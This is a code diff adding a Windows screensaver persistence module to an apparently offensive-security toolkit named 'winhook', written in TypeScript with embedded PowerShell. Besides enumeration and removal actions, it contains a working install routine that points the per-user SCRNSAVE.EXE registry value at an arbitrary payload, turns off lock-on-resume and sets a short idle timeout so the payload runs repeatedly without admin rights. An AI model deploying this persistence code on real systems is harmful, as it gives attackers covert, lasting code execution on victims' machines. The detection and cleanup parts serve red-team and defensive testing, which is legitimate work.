@@ -24906,6 +24906,160 @@ if (Test-Path $provPath) {
   return { output: output.join("\n"), findings }
 }
 
+async function screensaverPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const payload = argVal(args, "--payload")
+  const ssTimeout = argVal(args, "--timeout") || "60"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Screensaver Persistence...\n"]
+
+  const regPath = "HKCU:\\Control Panel\\Desktop"
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Screensaver Configuration ==="
+Write-Output ""
+
+$desktop = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue
+
+$scrnsave = $desktop.SCRNSAVE.EXE
+$active = $desktop.ScreenSaveActive
+$timeout = $desktop.ScreenSaveTimeOut
+$secure = $desktop.ScreenSaverIsSecure
+
+Write-Output "[*] SCRNSAVE.EXE: $(if ($scrnsave) { $scrnsave } else { '(not set)' })"
+Write-Output "[*] ScreenSaveActive: $(if ($active -eq '1') { 'Yes' } else { 'No' })"
+Write-Output "[*] ScreenSaveTimeOut: $(if ($timeout) { "$timeout seconds" } else { '(not set)' })"
+Write-Output "[*] ScreenSaverIsSecure: $(if ($secure -eq '1') { 'Yes (lock on resume)' } else { 'No' })"
+Write-Output ""
+
+if ($scrnsave) {
+  $exists = Test-Path $scrnsave -ErrorAction SilentlyContinue
+  if ($exists) {
+    $sig = Get-AuthenticodeSignature $scrnsave -ErrorAction SilentlyContinue
+    $hash = (Get-FileHash $scrnsave -Algorithm SHA256).Hash
+    Write-Output "[*] File exists: Yes"
+    Write-Output "[*] Signature: $($sig.Status)"
+    Write-Output "[*] SHA256: $hash"
+
+    # Check if it's a known Windows screensaver
+    $knownSS = @('ssText3d.scr','Bubbles.scr','Mystify.scr','Ribbons.scr','PhotoScreensaver.dll','scrnsave.scr')
+    $fileName = [System.IO.Path]::GetFileName($scrnsave)
+    if ($fileName -notin $knownSS) {
+      Write-Output "[!] Non-standard screensaver binary"
+    }
+  } else {
+    Write-Output "[!] SCRNSAVE.EXE points to non-existent file"
+  }
+}
+
+# Check GPO-enforced screensaver
+$gpPath = 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop'
+$gpSS = (Get-ItemProperty $gpPath -Name SCRNSAVE.EXE -ErrorAction SilentlyContinue).'SCRNSAVE.EXE'
+if ($gpSS) {
+  Write-Output ""
+  Write-Output "[*] GPO-enforced screensaver: $gpSS"
+  Write-Output "[!] GPO settings override user settings"
+}
+
+Write-Output ""
+Write-Output "[*] Screensaver runs as current user when idle timeout is reached"
+Write-Output "[*] .SCR files are just renamed .EXE — any executable works"
+Write-Output "[*] No admin required — per-user HKCU persistence"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("Non-standard screensaver")) {
+      findings.push({
+        checkId: "WIN-SCRN-001",
+        provider: "windows",
+        severity: "medium",
+        status: "SUSPICIOUS",
+        resource: "registry://screensaver",
+        title: "Non-standard screensaver binary configured",
+        details: "SCRNSAVE.EXE points to a non-standard binary that may be malicious.",
+        remediation: "Remove or replace with a legitimate screensaver.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!payload) {
+      output.push("ERROR: --payload required (path to payload executable)")
+      output.push("")
+      output.push("Usage: winhook screensaver_persist --action install --payload C:\\path\\payload.exe [--timeout 60]")
+      output.push("")
+      output.push("[*] .SCR files are just .EXE files — any executable works")
+      output.push("[*] Payload runs as current user when idle timeout is reached")
+      output.push("[*] No admin required — modifies HKCU (per-user)")
+      output.push("[*] Default timeout: 60 seconds of idle time")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing Screensaver Persistence ==="
+Write-Output "Payload: ${payload}"
+Write-Output "Timeout: ${ssTimeout} seconds"
+Write-Output ""
+
+# Save original values
+$orig = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue
+Write-Output "[*] Original SCRNSAVE.EXE: $($orig.'SCRNSAVE.EXE')"
+Write-Output "[*] Original ScreenSaveActive: $($orig.ScreenSaveActive)"
+Write-Output "[*] Original ScreenSaveTimeOut: $($orig.ScreenSaveTimeOut)"
+Write-Output ""
+
+# Set screensaver to payload
+Set-ItemProperty '${regPath}' -Name 'SCRNSAVE.EXE' -Value '${payload}' -Type String
+Set-ItemProperty '${regPath}' -Name 'ScreenSaveActive' -Value '1' -Type String
+Set-ItemProperty '${regPath}' -Name 'ScreenSaveTimeOut' -Value '${ssTimeout}' -Type String
+Set-ItemProperty '${regPath}' -Name 'ScreenSaverIsSecure' -Value '0' -Type String
+
+$verify = Get-ItemProperty '${regPath}'
+Write-Output "[+] SCRNSAVE.EXE: $($verify.'SCRNSAVE.EXE')"
+Write-Output "[+] ScreenSaveActive: $($verify.ScreenSaveActive)"
+Write-Output "[+] ScreenSaveTimeOut: $($verify.ScreenSaveTimeOut) seconds"
+Write-Output ""
+Write-Output "[*] Payload will run after ${ssTimeout} seconds of idle time"
+Write-Output "[*] Runs as current user (no admin needed)"
+Write-Output "[*] Persists across logons (HKCU registry)"
+Write-Output ""
+Write-Output "Remove: winhook screensaver_persist --action remove"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-SCRN-010",
+        provider: "windows",
+        severity: "high",
+        status: "PERSISTED",
+        resource: "screensaver://hkcu",
+        title: `Screensaver persistence installed: ${payload} (${ssTimeout}s idle)`,
+        details: "Payload runs as current user when idle timeout is reached. No admin required.",
+        remediation: "Remove: winhook screensaver_persist --action remove",
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const script = `
+Remove-ItemProperty '${regPath}' -Name 'SCRNSAVE.EXE' -Force -ErrorAction SilentlyContinue
+Set-ItemProperty '${regPath}' -Name 'ScreenSaveActive' -Value '0' -Type String
+
+Write-Output "[+] Screensaver persistence removed"
+Write-Output "[+] ScreenSaveActive set to 0"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -28554,6 +28708,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   appinit_dll: appinitDll,
   netsh_helper: netshHelper,
   time_provider: timeProvider,
+  screensaver_persist: screensaverPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
